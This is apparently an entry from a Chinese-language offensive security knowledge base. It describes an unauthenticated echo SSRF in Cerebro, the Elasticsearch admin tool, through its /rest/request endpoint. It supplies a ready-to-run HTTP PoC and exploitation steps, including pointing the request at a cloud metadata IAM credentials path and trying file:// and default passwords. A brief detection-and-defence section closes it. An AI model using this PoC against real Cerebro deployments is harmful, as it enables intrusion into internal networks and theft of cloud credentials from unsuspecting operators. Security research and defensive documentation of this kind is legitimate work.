---
id: web-generic-ssrf-cerebro-rest-request-host-path
title: Cerebro /rest/request 回显 SSRF：请求体 host/path 由客户端指定，服务端代发任意 HTTP 请求
type: scenario
domain: web
path: web/generic/ssrf
technique: cerebro-rest-request-host-path-ssrf
tags:
- web
- ssrf
- cerebro
- elasticsearch
- unauth
- internal-network
- cloud
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V530
  verified_at: '2026-11-11T17:03:20+08:00'
  notes: 已对照原文全文与6张图核对。原文 Cerebro 段：首页 /connect 连接 ES 接口无回显不列出；rest 查询接口可回显 SSRF；图04 为 Cerebro rest 功能页（path 输入框、GET 下拉、previous requests、cURL/format/send）；原文 POST /rest/request 报文 Host/Content-Type/Cookie 与请求体 {"method":"GET","data":{},"path":"","host":"http://10.0.0.142:18801/health"} 与卡片 PoC 逐字段一致。原文无响应回显截图，卡片 confidence=medium 合理，但请求样例来自实战文章、为完整可执行链，非理论原语。原文未标 Cerebro 版本，affected_versions 留空正确。dedup=new，与 Django doHttp、Langflow API Request 等『服务端代发 URL』卡相比产品/接口/请求格式不同，非同链。未对任何目标发起请求。
url: /docs/web/generic/ssrf/web-generic-ssrf-cerebro-rest-request-host-path/
draft: false
kb_aliases:
- Cerebro SSRF
- /rest/request
- Cerebro ES 管理
- host 参数 SSRF
- Elasticsearch 管理工具 SSRF
---

## 一句话结论

Cerebro 的 Web 控制台提供 `/rest/request` 接口，请求体中的 `host` 与 `path` 由客户端完全指定，服务端按此向目标发起 HTTP 请求并把响应返回；当 Cerebro 暴露在公网且无认证时，攻击者可借此做回显 SSRF，访问内网服务或云元数据。

## 原理

- Cerebro 是 Elasticsearch 的图形化管理工具，其 `/rest/request` 用于在页面上向 ES 集群发送 REST 请求；正常使用时 `host` 来自已配置的 ES 节点列表，但接口本身信任请求体中的 `host`，未做服务端白名单绑定。
- 攻击者构造 `{"method":"GET","data":{},"path":"","host":"http://10.0.0.142:18801/health"}`，Cerebro 服务端就会向该 host 发请求，并把状态码/响应体返回给调用者，形成回显 SSRF。
- 由于 Cerebro 常部署在能访问 ES 内网与云元数据的主机上，`host` 可替换为元数据 IAM 接口、K8s apiserver、etcd、内部 admin 面板等。
- 原文提到 `/connect` 连接 ES 的接口也可利用但无回显；`/rest/request` 有回显，是首选入口。

## 触发条件

- Cerebro（默认 9000）可从攻击者网络访问，未启用认证或使用弱口令；
- 当前用户可进入功能页面并调用 `/rest/request`；
- Cerebro 主机可访问目标内网或云元数据；
- 目标响应能通过接口返回（有回显）。

## 利用步骤

1. 访问 `http://target:9000` 确认 Cerebro 未授权；
2. 进入功能页（rest 标签），或直接构造请求：
   ```http
   POST /rest/request HTTP/1.1
   Host: target:9000
   Content-Type: application/json;charset=UTF-8

   {"method":"GET","data":{},"path":"","host":"http://10.0.0.142:18801/health"}
   ```
3. 观察响应体/状态码确认回显；
4. 把 `host` 换成元数据 IAM 路径（如 `http://100.100.100.200/latest/iam/security_credentials`）或内网管理端点，继续读取；
5. 若目标要求 ES 特定路径，可配合 `path` 字段拼接。

## PoC

```http
POST /rest/request HTTP/1.1
Host: target:9000
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Cookie: SESSION=<任意有效会话>; JSESSIONID=<任意有效会话>

{"method":"GET","data":{},"path":"","host":"http://10.0.0.142:18801/health"}
```

## 变体与关联

- `host` 支持任意 scheme（http/https），可尝试 `file://`（视实现）；
- 同类未授权回显 SSRF 组件：Consul 健康检查、Selenium Grid、Grafana 数据源、ClickHouse url()（库内均有独立卡）；
- 若 Cerebro 有认证，可尝试默认口令或从配置/日志泄露获取会话。

## 检测与防御

- Cerebro 管理端口不应暴露公网；启用认证并限制来源 IP；
- 服务端对 `/rest/request` 的 host 做白名单（仅允许已配置的 ES 节点），禁止元数据/内网地址；
- 网络侧禁止 Cerebro 主机访问元数据地址与不必要的内网网段；
- 审计 `/rest/request` 的异常 host 与高频请求。
